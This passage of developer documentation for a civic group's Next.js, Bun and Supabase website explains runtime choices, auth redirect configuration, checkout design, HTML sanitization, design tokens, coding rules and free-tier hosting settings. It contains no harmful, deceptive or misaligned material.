invocation is `bun --bun <bin>`, so the shim runs on Bun and then execs the
native binary behind it.

`bun fmt` also offers `sortTailwindcss` — Tailwind class sorting — which
Biome does not. It is tempting, and it is **not** an addition: Biome would
not sort, so the two formatters would undo each other on every file, and a
class order that one tool asserts and the other rejects is a formatting
argument rather than a formatting rule. It becomes viable only if Biome's
formatter is replaced outright, and the CSS is what blocks that.

### Three runtimes, none of them Node

The claim "no Node.js anywhere" is true, and it is true for a reason that is
not obvious: **the deployed app runs on two runtimes, and neither is Node.**

| Surface | Runtime | Node.js? |
|---|---|---|
| Serverless functions — route handlers, ISR renders | Bun 1.4.x (`bunVersion` in `vercel.json`) | no |
| Routing middleware (`middleware.ts`) | Edge — V8, no Node compatibility layer | no |
| Build, type check, unit tests, e2e, every script | Bun | no |

**The middleware is on the Edge runtime, and that is deliberate.** Next.js 16
deprecated the `middleware` file convention and renamed it to `proxy`, and the
rename is not housekeeping — it moves the code onto Node.js. Measured on this
repository, both ways, from the build output:

- `middleware.ts` compiles to the **Edge** runtime. The build manifest lists
  `server/edge/chunks/…` and the `edge-wrapper` template.
- `proxy.ts` compiles to a **Node** bundle — `server/middleware.js`, a
  CommonJS entry — and Next.js's own version history says why: *"Middleware is
  deprecated and renamed to Proxy. Proxy defaults to the Node.js runtime."*
  The build also rejects `export const runtime` inside a proxy file with
  *"Proxy always runs on Node.js runtime."*

So **the file convention decides the runtime**, and the current convention is
the one that keeps this project off Node.js. `middleware.ts` therefore stays,
with the reasoning recorded in the file's own docblock so a future
contributor does not "fix" the deprecation by reintroducing Node.

**Do not add `export const runtime` to `middleware.ts` either.** Next.js
accepts only `'edge'` and `'nodejs'`; `'nodejs'` would pin the auth gate to
Node, and unlike a build error, a runtime that differs between environments
fails at the first request rather than at the build.

**The Edge runtime is not Bun, and pretending otherwise would be its own
mistake.** It is V8 without the Node compatibility layer, which is why
`src/sentry.edge.config.ts` exists separately from `src/instrumentation.ts` —
the middleware's errors are reported by a different Sentry client because
they are raised in a different runtime. It also means the middleware cannot
use `node:` builtins, which is why `createServerClient` is the right call
there and a raw `pg`/socket client would not be.

### `npx` exists, and it is Bun

`bin/npx` in this repository is a shim that runs `bun x`. It is installed to
`~/.local/bin/npx` (which is on PATH here) and it exists because **Next.js
does not know about Bun.**

Next's package-manager detection (`get-pkg-manager.js`) checks for
`yarn.lock`, `pnpm-lock.yaml` and `package-lock.json`. A Bun project has none
of them, so it falls through to probing `yarn --version` and `pnpm --version`
and finally reports `npm` — and `get-npx-command.js` then returns the literal
`npx --yes`. On a machine with no Node.js that is a dead end:

```
$ bun x next@16.4.2 upgrade --agent latest
⨯ Could not prepare the upgrade: Executable not found in $PATH: "npx"
```

`npx <pkg> [args]` and `bun x <pkg> [args]` are the same operation, so the
shim maps one onto the other. That is what makes `next upgrade --agent`,
`next dev`'s agent hooks, and the `@next/codemod` runs work here at all.

Two flags are not the same and are handled explicitly: `--yes` is npm's
auto-confirm, which Bun has no equivalent for and never needs, so it is
dropped; and `--bun` is added, so a package cannot silently fall back to a
Node runtime that does not exist.

### The toolchain runs on the Bun canary; production runs on stable

**The developer toolchain and CI run the latest Bun canary.** The project
pins it in `.mise.toml`:

```toml
[tools]
"npm:bun" = "canary"
```

Three things about that line are load-bearing.

**The `npm:` backend is deliberate.** Bun's GitHub releases do not publish a
`canary` tag with a matching archive — mise's `core:bun` backend fails with a
404 on `bun-vcanary`. The npm package *does* publish a `canary` dist-tag with
a real platform binary for every supported target, so the npm backend is the
one that resolves.

**It is pinned to the channel, not to a version.** Bun cuts canaries from the
release branch, so a canary's version number is **not** monotonic against the
stable releases: a canary can carry a lower number than the stable release
that superseded it (`1.4.3-canary.20261019.1` ships a `1.4.4-canary`
binary). Pinning a canary *version* would be false precision. The channel is
the unit that means "the latest canary".

**The old CI pin was broken, not merely conservative.** CI asked
`oven-sh/setup-bun` for `BUN_VERSION: "1.4.4"`, and `bun-v1.4.4` has never
existed as a GitHub release — `setup-bun` resolves a strict-semver version to
`bun-v<version>` directly, so that step was a 404 on every job. The
`canary` channel is resolved from the `refs/tags/canary` tag, which does
exist.

**Production still runs a stable Bun.** `vercel.json` sets
`"bunVersion": "1.4.x"`, and Vercel's Bun runtime accepts only `"1.4.x"` and
`"1.x"` — a canary cannot be deployed there. So:

| Where | Bun | Why |
|---|---|---|
| Developer machine | canary | `.mise.toml`; the toolchain should track the frontier |
| CI | canary | `BUN_VERSION: "canary"`; the same reason, and the same fleet |
| Vercel production | `1.4.x` (stable) | the only values Vercel's Bun runtime accepts |

The divergence is deliberate and bounded: the runtime that *executes* the
application is pinned and stable, and the runtime that *installs and builds*
it tracks the canary. `bun.lock` pins the dependency graph either way, so a
canary Bun can change how the tree is installed but not what is in it.

### The project is typed against Bun, not against Node

`tsconfig.json` carries an explicit `types` allowlist — `bun-types`, `node`,
`react`, `react-dom` — so the global type surface is a decision rather than
whatever happens to be in `node_modules/@types`. `bun-types` is Bun's own type
package; it is what makes `Bun.file`, `Bun.spawn` and the `bun:*` modules
type-checked here.

**The `typescript` package is backed exclusively by `tsrs`**, the native
Rust compiler port of TypeScript 7 (Cloudflare + VoidZero). It is provided
via `tools/typescript-shim/`, which Next.js resolves under
`experimental.useTypeScriptCli` (see "The `typescript` package is a shim").
Both the build's internal type check and the project's `bun run typecheck`
gate run the identical native `tsrs` compiler binary, with zero JavaScript
runtime overhead and zero Node.js.

**`@types/node` is still present, and it cannot be removed.** `bun-types`
*extends* Node's compatibility layer rather than replacing it — its
`index.d.ts` opens with `/// <reference types="node" />` and the package
depends on `@types/node` outright — and Next's own `next/types/global.d.ts`
carries the same reference. The `node:` builtin module declarations the
scripts import (`node:fs`, `node:child_process`) come from there too. So
"remove Node" means the *runtime* and the *toolchain*, which is done; the
*type declarations* are a compatibility surface Bun itself depends on.

**One consequence is load-bearing, and it is a test-shaped one.** Bun's
`fetch` is the Fetch API plus a `preconnect` member, so `globalThis.fetch` is
not the DOM's `fetch` and a `vi.fn()` is not assignable to it. Rather than
cast thirty-four times across six suites, there is one helper:
[`src/lib/__tests__/fetch-mock.ts`](./src/lib/__tests__/fetch-mock.ts). It
*completes* a mock — adding `preconnect` as a no-op — so the object genuinely
is a `typeof fetch`, and it holds the repository's only fetch-mock cast, in
one documented place. A new suite that stubs `fetch` uses `installFetchMock`
rather than reaching for the global directly.

### App Router structure
- **Server Components** handle all data fetching via `createClient` from `@supabase/ssr`.
- **Client Components** are scoped to interactive leaves: Cart, Wishlist, command palette, Stripe checkout.
- Dynamic pages use `[slug]` routing; `generateMetadata` is mandatory on every dynamic route.
- `cacheLife` profiles are set to `"hours"` across all catalog and content fetches — do not change to `"minutes"` until the project moves to Vercel Pro (see Conservation Mode below).
- **The `/products` sidebar categories query is cached, and that is the end of it.** An uncached inline fetch here used to log a prerender warning on every build; `0e65c6a` lifted it out of the page into `getCategories()` with `'use cache'`, `cacheLife('hours')` and `cacheTag('categories')`, and a clean build is now silent. A follow-up once asked for it to move inside a Suspense boundary, and that half is moot: `/products` sets `export const instant = false` — a deliberate Block opt-out, because per-category SEO titles require awaiting `searchParams` in `generateMetadata` — so there is no prerender pass to warn about, and the segment's boundary is `src/app/products/loading.tsx`, which already covers the whole page. Adding a second boundary would trade a warning that no longer exists for a flash of an empty sidebar. Re-verified 2026-09-30 with `rm -rf .next && NEXT_E2E_BUILD=true NEXT_SKIP_ENV_VALIDATION=1 bun run build`: `/products` prerenders as `◐`, build silent.

### Site identity — one source of truth
**`src/config/site.ts` owns "where does this site live".** `metadataBase`, every
canonical URL, every `og:url`, `sitemap.xml`, `robots.txt`, and all JSON-LD
`@id`/`url` values derive from `env.NEXT_PUBLIC_SITE_URL`. Nothing may hardcode
`indivisiblefairoaks.org` for those purposes.

- Build page metadata through `pageMetadata()` in `src/lib/metadata.ts`. It
  guarantees a canonical, an `og:url`, a Twitter card and a robots directive.
  Returning a hand-written `Metadata` literal is how the `og:url` bug happened.
- **Next replaces, never merges, `openGraph`.** A child that declares its own
  `openGraph` discards the parent's — including `images` from the
  `opengraph-image` file convention. This is why `pageMetadata` sets an explicit
  default card.
- `IS_PRODUCTION_SITE` is true only when the configured origin is the apex.
  Otherwise the whole build emits `noindex, nofollow` and `robots.txt` returns
  `Disallow: /`, so previews and staging can never compete with the apex.
- **The apex cutover is therefore a single env change**, not a code sweep. See
  `docs/apex-cutover-runbook.md`.
- `app/page.tsx` shares its segment with the root layout, and Next does not
  apply a segment's own `title.template` to itself — the homepage must pass an
  absolute title.

### Navigation and legacy URLs
- `src/config/routes.ts` is the single source of truth for primary navigation.
  `Header.tsx` renders the desktop row and the drawer from it, and
  `isActiveRoute()` supplies `aria-current`. Add a link there, not inline.
- **The horizontal nav row is `2xl` and above only.** The nine labels at
  `tracking-[0.2em]` render a ~1047px row, which needs ~1700px of viewport with
  the logo and action cluster. That fits no standard breakpoint at full label
  length, which is why `NavLink.short` exists: the desktop row uses the short
  label, the drawer uses the full one. Do not drop `short` — without it the row
  silently reverts to ~1700px and overflows.
- `e2e/header-fit.spec.ts` asserts the header fits at eight widths from 320px to
  1920px and that the account entry is reachable at every one. It exists because
  this has already broken twice, and the symptom (a Playwright click timeout) did
  not identify the cause.
- `src/config/legacy-redirects.ts` maps the old Google Sites paths to their real
  equivalents as permanent redirects. It is imported by **both** `next.config.ts`
  (which cannot resolve the `@/` alias, hence the standalone module) and
  `getAllPublishedSlugs()`, so a shadowed CMS slug is never prerendered. The two
  cannot drift.

### Supabase backend
- PostgreSQL with RLS on every user-facing table. Anon key = read-only + insert on allowlisted tables only.
- Auth includes MFA support. Middleware enforces session checks on `/account`, `/admin`, `/login` **only** — do not expand middleware scope without checking Fluid CPU budget.
- Edge Functions: `notify-contact`, `checkout`, `search`, `webhook`, `health`,
  `wall-e-chat`, `walle-refresh`, `crm-broadcast-send`, `data-points`. All are deployed by
  `.github/workflows/supabase.yml`; `crm-broadcast-send` joined that list only
  recently, and until it did, `CRM_BROADCAST_FUNCTION_URL` pointed production at
  a route no pipeline shipped. Invoked directly from Server Actions; never call
  Edge Functions from Client Components.
  **JWT verification is on unless a step says `--no-verify-jwt`.** Five functions
  are deliberately public (`notify-contact`, `search`, `webhook`, `health`, `data-points`);
  `checkout`, `wall-e-chat`, `walle-refresh` and `crm-broadcast-send` require a
  key. A step that silently loses the flag turns a credentialed endpoint into a
  public one; one that silently gains it makes an internal endpoint unreachable.
  The `verify` job probes each function and asserts the specific expected code —
  400, 400|401, 405, 401 for `crm-broadcast-send`, or 200 for `health` and `data-points` — so neither direction passes
  silently. **A config var and a deploy step have to land together.**
- `supabase/config.toml` governs the **local** CLI stack only. The hosted
  project's `site_url` / `additional_redirect_urls` live in the dashboard —
  Authentication → URL Configuration. Magic links and OAuth callbacks fail
  closed against that list, so an apex cutover that misses it strands every user.
- **The hosted Site URL and redirect allow-list drifted to an unrelated domain,
  and nothing in the repository could see it.** Both read
  `https://ai.foodshare.club` while the app served
  `https://test.indivisiblefairoaks.org`, so every magic link went to a host with
  broken TLS *and* this project's own callback was rejected, because the
  allow-list named only the wrong host. Login was broken end to end with no
  failing test, build or review — the state lives in a dashboard. Fixed by
  `PATCH /v1/projects/<ref>/config/auth`, and `scripts/check-auth-redirects.mjs`
  now reconciles both settings nightly from `secret-audit.yml`, with an offline
  pre-commit half proving no absolute `/auth/callback` URL returns to source.
  The login page builds its callback from `window.location.origin`, so the app
  is correct on every host by construction and the hosted settings are the only
  place the origin can go wrong.
- **The redirect allow-list is comma-separated, and getting that wrong fails
  silently.** `GOTRUE_URI_ALLOW_LIST` is documented as "a comma separated list of
  URIs" and GoTrue's config field is a `[]string` populated by go-envconfig,
  which splits slices on commas. Newlines are **not** a separator: the Management
  API strips them from a multi-line value before storing, collapsing three URLs
  into one entry that matches nothing. `uri_allow_list` must also be a string —
  an array is a `400`. So the correct write is one comma-separated string, and
  this project carries all three hosts that way:
  `site_url` is the origin the deployment serves, and the allow-list is the
  staging, apex and `www` callbacks. `scripts/check-auth-redirects.mjs` parses on
  commas for the same reason and reports a concatenated value as drift,
  because the corrupted result *looks* configured while rejecting every
  callback — strictly worse than an obviously empty list.
- **`otp_disabled` is not evidence that auth email is off.** Auth email *is*
  configured (`smtp.resend.com:465`, user `resend`, sender and admin address
  set) and the mailer path authenticates — a live `AUTH LOGIN` against the relay
  returns 235. GoTrue answers `otp_disabled` for an address that has no account,
  because confirming it either way would enumerate users, so a probe using a
  synthetic address "proves" nothing either way. An earlier revision of this file
  asserted the opposite on exactly that evidence; it takes a real account to
  test, and a guess here becomes a false statement in an authoritative document.
  `/authorize` is the probe that does carry meaning: every provider reports
  unsupported or disabled, so `signInWithOAuth` cannot complete until one is
  configured. `signInWithOtp` and `resetPasswordForEmail` have a working mailer
  behind them and are limited by whether the address has an account.
- **RLS role-repair pattern**: after project restore/re-provisioning, policy→role OID references can orphan (`pg_policies` shows `{public}` but matches nobody). Playbook: `DROP POLICY … ; CREATE POLICY … TO authenticated …`. There is no dedicated migration for this — the pattern responds to a re-provisioning event rather than a schema change, so it lives in `scripts/rls-role-repair.mjs` and not in `migrations/`.

### Commerce
- `src/config/commerce.ts` owns currency, shipping rates and price formatting.
  Stripe sessions, the Product JSON-LD and the storefront all read from it.
  The site previously charged `nzd` with Auckland pickup addresses while its
  structured data advertised `USD`; do not reintroduce a per-site currency
  literal. Shipping rates are placeholders pending the chapter's confirmation.
- **The checkout wire payload is built in exactly one place.**
  `buildCheckoutItems()` in `src/lib/checkout-validation.ts` serves both
  `cart/page.tsx` and `StripeExpressCheckout`, which previously inlined the same
  six-line mapping. Two hand-copied shapes is how this storefront shipped `nzd`
  checkout beside `USD` structured data; a parity test cannot catch a field one
  site forgot to send, but a shared function can. Its `variationId ?? undefined`
  is load-bearing — the cart store carries `number | null` while the validator
  accepts only a positive integer or `undefined`, so a null reaching the server
  is a 400 on a perfectly ordinary cart.
- **There is deliberately no idempotency key on `checkout.sessions.create`.**
  The obvious candidate — a hash of the cart — is wrong: Stripe returns the
  cached response for a key for 24 hours, so buying the same cart twice in a day
  hands back the *first*, already-completed session and charges nothing for the
  second. The orphan session a key would prevent is cosmetic, and the
  parallel-submit case is already closed by `disabled={isLoading}` on the cart
  button. The full reasoning sits at the call site in
  `src/app/api/checkout/route.ts`. **Do not "fix" this without reading it.**
- **Orders are provider-agnostic and the store is not yet connected.** There are
  no live orders, so the admin and account surfaces are empty-state shells that
  render the stored row currency with `CURRENCY_CODE` as fallback and format
  with `formatPrice` — never a per-site literal (`commerce-no-nzd.test.ts` fails
  the build on any `nzd` residue outside the historical record). A future
  WooCommerce store writes through `mapWooOrderToRow()` in
  `src/lib/commerce/orders.ts` into the same `orders` table with
  `source = 'woocommerce'` (migration `20261009000000`, CHECK
  `orders_source_check`); a new provider adds a mapper plus a CHECK value in the
  same change, never a second orders table. Reads do not select
  `source`/`external_id` until that migration has been pushed — PostgREST refuses
  a select naming an unknown column, so the hand-written order types carry both
  as optional until then.

### Sanitization layer
`sanitizeWPContent` in `src/lib/` must wrap **all** HTML from the `content` table before render. It:
1. Strips Google Sites page furniture — see below.
2. Removes legacy WPForms shortcodes (replaces with native contact component).
3. Strips spam keywords (Casino, Slot, Betting, etc.) and their parent elements.
4. Drops outbound links not matching trusted domains (supabase.co, stripe.com, indivisiblefairoaks.org).

Never render raw Supabase HTML without this helper — treat it as a security boundary.

**Spam keywords match on word boundaries, not substrings.** All three call sites
— `isSpamContent`, the element-removal pass, and the contact form — go through
`containsSpamKeyword()`, which builds `\b<keyword>(?:s|es|ed|ing)?\b`. This is
load-bearing in both directions. The inflection allowance is why `isSpamContent(
'hot slots action')` is still spam. The boundaries are why a paragraph about a
**judicial** review or **pragmatically** better canvassing survives: matching
`'judi'` as a substring deleted the entire `<p>`, `<div>` or `<a>` that mentioned
it, and the contact form told the resident they were a spammer. The list is
still aggressive on purpose — a bare `slot`, `bonus` or `bingo` *is* still a hit,
which is documented in `sanitize-keywords.test.ts` rather than left as a
surprise. Adding a fourth matcher here re-opens the same bug; export and use
`containsSpamKeyword` instead.

**The block editor must produce markup the sanitizer preserves.** A property
test asserts `sanitize(serialize(blocks)) === serialize(blocks)` for arbitrary
blocks. It is the only thing standing between a newly added block type and
silently vanishing on publish — it is how a `button` block was caught being
deleted. The one documented exemption is content that is genuinely spam, since
deleting that is the filter working. A failure here is a sanitizer bug or a
missing block type, not a flaky test.

**The sanitizer's allowlist is therefore load-bearing, and the test that says so
must keep saying it.** An image's measured `width` / `height` reach the reader
only because `img: ['src', 'alt', 'width', 'height', 'loading']` permits them.
The properties were present in the model and the serializer from the start and
populated by nothing; the moment the uploader began filling them in, the
allowlist became a correctness dependency rather than a tidy list. Narrowing it
now fails the round-trip test at the boundary instead of as a slow, invisible
regression in the field.

**Container tags are dropped with their bodies, and the option that sounds like
it does this does not.** `disallowedTagsMode: 'discard'` strips a tag and keeps
its children — right for inline markup, wrong for a container. A migrated page's
`<form>` or `<marquee>` re-injected its contents as live body copy, and
`htmlToExcerpt` runs the same sanitizer, so that copy also reached the SERP meta
description. Two options look like the fix and are neither:

- **`nonTextTags`** sets sanitize-html's `skipText`, which suppresses the *raw
  text* directly inside a disallowed tag. A container's children are elements, so
  `<marquee><p>x</p></marquee>` still emitted the `<p>`. It is correct for
  `script` / `style` / `textarea` / `option` and nothing more.
- **`exclusiveFilter`** is never consulted for a tag that is *already disallowed* —
  sanitize-html returns from its close handler before reaching it. Returning true
  for `form` there does nothing at all.

**`sanitize-html` is pinned at `>= 2.18.0`, and the reason is this file's own
mechanism.** GHSA-x3q4-9hxx-gx8m: a `discard` region's end was decided by
htmlparser2's *implicit* close, while a browser ends a raw-text element at the
literal `</noscript`. An end tag for an ancestor could therefore make
htmlparser2 close the element early, and the content after that point was
rendered rather than discarded. The fix keeps discarding until the offset the
browser would have used, and the upstream source names the advisory.

That is not a hypothetical for this file: `disallowedTagsMode: 'discard'` and
`nonTextTags` are exactly the two options the advisory is about, and
`htmlToExcerpt` runs the same sanitizer — so a discarded region's early end
would have reached the SERP meta description as well as the page.
`bun run audit:deps` is what caught it; the baseline entry it would have
needed is not there, because the fix was a version bump rather than an
accepted risk.

The removal is a **pre-pass**, and its position is the part that is invisible
until it bites. The pass that strips active-content tags already removes the
opening and closing tags of `form`, `object`, `select` and `marquee`, destroying
the evidence: afterwards there is no `<marquee>` left to match, so a subtree
removal placed after it silently matches nothing. Both wrong fixes were applied
and observed to change nothing before the ordering was found.
`sanitize-hardening.test.ts` pins every member of `MIGRATED_PAGE_FURNITURE` and
the ordering. The unclosed-tag sweep runs to the end of the input, so it is
applied **only** to the four tags whose truncated variants the migration actually
left behind; extending it to `<form>` would delete the rest of a valid page.

**The CMS bodies are plain text, not HTML.** The Google Sites export stripped
every tag, so the site chrome arrived as literal lines — "Search this site",
"Skip to main content", a sidebar navigation repeated three or four times, and a
trailing "Report abuse / Page details / Page updated" block. Tag-based filtering
cannot see any of it. `stripMigratedSiteChrome()` handles it, gated on
`looksLikeGoogleSitesExport()` so it can never touch hand-authored content.

Derive meta descriptions with `htmlToExcerpt()`, never by slicing the raw body.
Slicing raw text is how shipped SERP snippets came to begin "IndivisibleFairOaks.org
- Links Search this site Embedded Files…".

---

## Design System — "Sensory Luxury"

Tokens are defined in `src/app/globals.css` via `@theme`. No `tailwind.config.*` file exists.

### Active color tokens
| Token | Hex | Usage |
|---|---|---|
| `--primary` | `#1e3a8a` / `#155dfc` | Primary blue — buttons, links, active states |
| `--primary-light` | `#2563eb` | Hover/focus variants. **Light surfaces only** — 3.5:1 on the dark header |
| `--primary-dark` | `#172554` | Pressed/deep variants |
| `--primary-ink` | `#1e3a8a` | Text on light surfaces (replaces raw lime) |
| `--secondary` | `#16305c` | Page backgrounds, dark surfaces, header/footer anchor |
| `--ink-strong` | `#0f172a` | High-contrast text on amber CTAs (7.2:1 contrast) |
| `--ink-on-dark` | `#cbd5e1` | Body copy on dark surfaces |
| `--ink-muted-on-dark` | `#a3b4c9` | Secondary copy on dark surfaces (>=5.3:1 on raised cards) |
| `--primary-bright` | `#155dfc` | Brand blue as a **surface on dark pages** (CTAs) |
| `--primary-on-dark` | `#8ec5ff` | Brand blue as **display text on dark** (hero highlights) |
| `--primary-on-dark-muted` | `#7cbaff` | Brand blue as **eyebrow/label text on dark** (>=4.8:1 on raised cards) |
| `--accent` | `#d97706` | Amber — donate CTA, warnings. **Surface, not text** |
| `--accent-gold` | `#f59e0b` | Active nav indicators, dark-surface accents. **Surface/border, not text** |
| `--accent-gold-on-dark` | `#fcd34d` | Gold as **text on a dark surface** (5.30:1 on the gold-tinted chip, 10.93:1 on `--surface-deep`) |
| `--accent-red` | `#dc2626` | Destructive actions, errors |
| `--accent-lime` | `#d1ff00` | Dark-surface non-text accent only |
| `--surface-muted` | `#f4f8ff` / `#1a3768` | Secondary panels, trays, inputs |
| `--surface-card` | `#ffffff` / `#1e427e` | Raised content cards (1.33:1 luminance lift above dark canvas) |
| `--surface-deep` | `#e2ecfc` / `#0f2244` | Sunken containers, code blocks |
| `--border` | `#c3d3f0` / `#3a6699` | Hairline card borders, subtle dividers |

Use `text-primary-ink` for any text placed on light/white surfaces. Raw lime
(`#D1FF00`) is reserved for dark-surface non-text accents only — do not use it for
body or heading text.

**`--accent` and `--accent-gold` are text-unsafe on white** (3.19:1 and 2.15:1)
and `--primary-light` is text-unsafe on the dark header (3.51:1). These are
surfaces. On an amber background use `text-ink-strong` (7.2:1); on a dark
background use the `--ink-*-on-dark` pair. The axe gate in `e2e/a11y.spec.ts`
enforces this — do not "fix" a failing contrast check by swapping to a token
without re-measuring.

**`--accent-gold` is text-unsafe on dark too, and that one is subtler.**
`#f59e0b` measures 7.34:1 on `--surface-deep`, so it looks safe on a dark
page — but only 3.56:1 on a gold-tinted chip, because the tint lifts the
background to `#495467` and the amber has nowhere left to go. The three civic
badges that tinted their own background were failing axe for exactly that,
at 3.56:1 and 4.03:1 against a 4.5:1 bar for 11px bold uppercase text. Use
`--accent-gold-on-dark` (`#fcd34d`) for gold text on dark: 5.30:1 on the
tinted chip, 6.00:1 on the lighter variant, 10.93:1 on `--surface-deep`. It
is the same shape as the `--primary-on-dark` fix below — a colour that works
as *text* on dark had no token, so the pages reached for the surface one.

### Radius, elevation and motion tokens
`@theme` also defines `--radius-*` (`xs`…`3xl`), `--shadow-*` (`card`, `raised`,
`float`, `hero`, `header`), `--ease-sensory`, and `--duration-fast` (300ms) /
`--duration-slow` (500ms). Prefer these over ad-hoc `rounded-[2.5rem]` and
`shadow-[0_40px_100px_-20px_rgba(...)]` values.

`--primary-bright` / `--primary-on-dark` / `--primary-on-dark-muted` exist because
`--primary` is only 1.5:1 against `--secondary` — correct as a surface on white,
but a CTA built from it disappears on a dark page. The token set had no
"brand blue on dark" entry, which is why the civic pages reached for raw
`blue-600`. Adding a token was the fix; re-measuring first was the discipline.

### Changing colours: measure, then sweep
Never find-and-replace palette classes blind. The tooling exists:

```bash
bun run palette /about        # colours actually painted, by area, vs the tokens
bun run token-sweep -- --check  # dry run of the class mapping
bun run snap before           # capture every route to .snapshots/before/
# …make the change…
bun run snap after            # …then diff the two
```

Every mapping in `scripts/token-sweep.mjs` was chosen so the replacement resolves
to the colour the page was already painting (within ~1.03:1). The pixel diff is
what proves it, and the light pages act as the control: `/products`, `/login` and
`/contact` must read 0.00% changed. Gradient stops (`from-`/`via-`/`to-`) are
deliberately excluded — the atmospheric gradients are a design decision, not a
consistency problem.

### Enter/exit animation layer
`@utility animate-in` / `animate-out` and the `fade-*`, `zoom-*`, `slide-*`
composition classes are implemented **in `globals.css`**, not by
`tailwindcss-animate` (which is not a dependency and never was). Every
`data-[state=open]:animate-in fade-in-0 zoom-in-95` on a Radix primitive depends
on this layer existing. Adding a new variant means adding a `@utility` that sets
the matching `--tw-enter-*` / `--tw-exit-*` variable.

### Typography
- **Headings**: Outfit font, `font-black uppercase tracking-tighter`
- **Navigation**: `font-bold uppercase tracking-[0.2em]`
- **Body**: Inter font, `font-medium text-slate-600 leading-relaxed` on light
  surfaces; `text-ink-on-dark` on dark ones (`text-slate-600` is 1.86:1 on
  `bg-slate-950` and unreadable)

### Motion
- Use `motion` (the `motion` npm package, not `framer-motion`) for complex transitions.
- Tailwind utilities for micro-animations (hover scale, opacity, color transitions).
- All transitions must be `ease-out`, duration `300ms`–`500ms`. Avoid durations over 500ms for interactive feedback.
- The global `prefers-reduced-motion` guard covers CSS only. JS motion
  (`motion`'s `whileHover`, `scrollIntoView`, `scrollBy`) bypasses it — check
  `useReducedMotion()` / `matchMedia` at those call sites.

### Stacking order is one scale, not ad-hoc numbers
Five surfaces stack, and they were on five unrelated arbitrary `z-[…]` values.
The Wall-E launcher (`z-120`) sat **above** the open nav drawer (`z-110`), so on
mobile the chat bubble floated on top of the drawer and a click there opened a
second dialog over a surface that still held the focus trap. The command palette
overlay also tied with the Wall-E panel, so DOM order decided the winner.

| Layer | Class | Surface |
|---|---|---|
| 1 | `z-50` | `<header>` |
| 2 | `z-[60]` / `z-[70]` | WALL-E launcher / panel |
| 3 | `z-[100]` / `z-[110]` | Nav drawer overlay / content |
| 4 | `z-[120]` / `z-[130]` | Command palette overlay / content |

Overlay and content always differ by 10, and a modal layer sits above every
non-modal one. If you add a surface, put it on this scale.

### Scrollable regions must be focusable
An `overflow-x-auto` container is no longer focusable by default in Chrome and
Firefox, so a carousel without `tabIndex={0}` cannot be scrolled by a keyboard
user at all. `ProductSlider` follows the WAI-ARIA Scrollable Region pattern
(`<section aria-label>` + `tabIndex={0}`); Biome's `noNoninteractiveTabindex`
does not model it and is suppressed for that one file.

### No fake controls
A control must do what it says. `ChoirAudioPlayer` shipped a range input labelled
"Seek harmonic broadcast" over a Web Audio oscillator stack with no media
element — nothing to seek, and the `onChange` moved local state only. It is now a
read-only `role="progressbar"`. Check whether a control has an effect before
styling it.

### Reveal-on-hover must be hover-gated
`group-hover:opacity-100` alone hides a control on every touch device and leaves
it in the tab order while invisible on desktop. Gate the reveal with the
`hover-capable` custom variant (`@media (hover: hover)`) and add
`focus-within:opacity-100`. `ProductCard`'s wishlist button is the reference.

---

## Coding Rules

1. **Tokens always** — no hardcoded hex, no arbitrary Tailwind values for brand colors.
2. **generateMetadata everywhere** — every `page.tsx` must export it; title and description must be unique.
3. **Sanitize all CMS content** — `sanitizeWPContent` before any `dangerouslySetInnerHTML`.
4. **No console.log in committed code** — enforced by oxlint.
5. **No layout shift** — always provide width/height on `next/image`; use `aspect-ratio` utilities for unknown-dimension embeds. For a CMS image, **measure the size rather than reserve a guess**: `measureImageSize` reads the intrinsic dimensions from the bytes, and a block that cannot be measured must render in a fixed frame — never neither. See [`docs/content-editor.md`](./docs/content-editor.md#an-image-is-measured-or-the-frame-is-fixed--never-neither).
6. **Server-only env reads** — `process.env.SUPABASE_SECRET_KEY` etc. are accessed as dotted properties, never spread into objects, never imported into client modules. Public `NEXT_PUBLIC_*` vars are safe to access anywhere.
7. **Exact dependency versions** — use `^` only; pin via `overrides` for any package with a known CVE. `bun audit` is what makes "known CVE" computable, and `bun run audit:deps` is the gate that enforces it. See [Dependency vulnerabilities](#dependency-vulnerabilities).
8. **MFA guards** — account-mutating operations must check MFA enrollment status server-side. See [`docs/mfa.md`](./docs/mfa.md).
9. **A `'use server'` module may only export async functions**, and the build
   enforces it — `Error: Only async functions are allowed to be exported in a "use
   server" file.` So a constant or a helper a *client* component needs cannot live
   beside the actions it describes, however much it belongs there. The CRM's
   numeric bounds live in [`src/lib/crm-limits.ts`](./src/lib/crm-limits.ts) and
   the step-up error discriminant in
   [`src/lib/mfa-guard.ts`](./src/lib/mfa-guard.ts). Each of those four was in the
   wrong file first, and the build said so.

---

## Vercel Free-Tier Conservation Mode

The team shares one Fluid Active CPU pool (4 hrs / rolling 30 days). **Do not revert these settings without checking the Usage dashboard first.**

| Setting | Value | Reason |
|---|---|---|
| `cacheLife` for catalog/content | `"hours"` | Minimizes background revalidation renders |
| Middleware scope | `/account`, `/admin`, `/login` only | Middleware runs on every matched request |
| Image quality | `75` | Reduces transform CPU |
| Image cache | 31-day CDN TTL | Avoids repeat transforms |
| Logo | Served unoptimized | Tiny file; transform cost not worth it |
| Sitemap | `cacheLife: 'hours'`, one query per crawl wave | Not truly static — a real query is cheaper than re-rendering |
| Checkout rate limit | 10/min/IP | Stripe fraud + CPU protection |
| Contact rate limit | 3/10min/IP | Anon-key flood protection |
| Pre-push e2e | Playwright when push touches runtime surfaces | Delivery gate without punishing docs-only pushes |
| Function runtime | `bunVersion: "1.4.x"` in `vercel.json` | The serverless functions — route handlers, ISR renders — run on Bun. `"1.4.x"` is the Rust rewrite — `"1.x"` resolves to 1.3.14, the version with the reported Next 16.3 build failure. **This does not cover the middleware**, which runs on the Edge runtime — see [Three runtimes, none of them Node](#three-runtimes-none-of-them-node). It is also the only value Vercel accepts for a canary-free deployment: the toolchain runs the Bun canary, production cannot |
| Build command | `bun run --bun next build` | Vercel requires the Bun runtime for the build when the functions run on Bun and the app uses ISR. This app does — every route carries `revalidate: 900` |

When the project moves to Vercel Pro, revisit `cacheLife: "minutes"` for price and stock freshness.

**The plan constrains configuration, not just performance.** A `vercel.json` with
a `* * * * *` cron failed the *build*, not just the schedule: the free tier
rejects sub-daily cron expressions, so the deployment for `c6ebb3ff` never
completed and `main` was left undeployable. It was reverted in `47c12542`.

Nothing local catches this — the pre-push gate ran the full suite, the build and
112 e2e, all green, because the fault is a hosted-plan constraint rather than a
code defect. Before adding a platform config file, check the tier first.
Anything needing sub-daily scheduling must use Supabase `pg_cron`, not Vercel
crons.

---

## Secrets & configuration — four stores, one reconciler

Credentials and runtime config live in four independent places, each with a
declared contract and a pre-commit checker. Full inventory:
